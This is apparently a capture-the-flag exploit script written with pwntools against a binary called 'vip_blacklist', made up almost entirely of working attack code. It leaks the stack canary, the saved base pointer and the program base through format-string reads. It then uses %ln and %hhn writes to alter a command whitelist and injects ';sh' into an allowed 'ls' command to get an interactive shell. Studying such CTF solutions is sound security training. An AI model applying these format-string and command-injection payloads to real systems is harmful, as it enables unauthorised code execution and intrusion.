#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("vip_blacklist")

gs = """
brva 0x01A02
b *safety+260
"""


def start():
    if args.LOCAL:
        p = e.process()

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


# while True:

p = start()

p.sendlineafter(b"Commands: clear exit ls", b"%27$p\0")
p.recvuntil(b"Executing: ")
save_rbp = int(p.recv(14).decode(), 0)

#     if save_rbp & 0xff != 0x10:
#         p.close()
#     else:
#         break


p.sendlineafter(b"Commands: clear exit ls", b"%38$p\0")
p.recvuntil(b"Executing: ")
e.address = int(p.recv(14).decode(), 0) - e.sym.main


p.sendlineafter(b"Commands: clear exit ls", b"%26$p\0")
p.recvuntil(b"Executing: ")
canary = int(p.recv(16).decode(), 0)


log.info(hex(e.address))
log.info(hex(canary))
log.info(hex(save_rbp))
rbp = save_rbp-0x10


p.sendlineafter(b"Commands: clear exit ls", b"%8$p\0")
p.recvuntil(b"Executing: ")
gen_ = int(p.recv(14).decode(), 0)

p.sendlineafter(b"Commands: clear exit ls",
                f'%15$ln'.encode().ljust(0x10, b'\0') +
                p64(gen_)
                )


p.sendlineafter(b"Commands: clear exit ls", b'')
p.sendafter(
    b"If you would not like this, just press enter.\n", b"queue\0clear\0exit\0\0ls\0;sh\0\n")

p.sendlineafter(b"Commands: clear exit ls",
                f'a%15$hhn'.encode().ljust(0x10, b'\0') +
                p64(e.sym.whitelist+20)
                )  # change "ls" -> "ls\x01;cat flag*"
# p.interactive()


if args.GDB:
    gdb.attach(p, gdbscript=gs)
    pause()

p.sendlineafter(b"Commands", b"ls\x01;sh")

p.interactive()
